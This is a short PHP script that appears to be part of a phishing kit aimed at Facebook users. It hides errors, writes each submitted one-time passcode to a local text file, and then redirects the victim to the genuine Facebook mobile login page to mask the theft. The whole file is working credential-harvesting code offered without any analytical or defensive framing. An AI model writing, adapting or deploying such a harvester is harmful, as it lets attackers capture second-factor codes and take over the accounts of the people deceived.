<?php
error_reporting(0);
ini_set('display_errors', 0);
file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://mbasic.facebook.com/login/?email=&li=7HuNXheRQXhWYv5BGRmu6HKI&e=1348092&refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&_rdr');
exit();
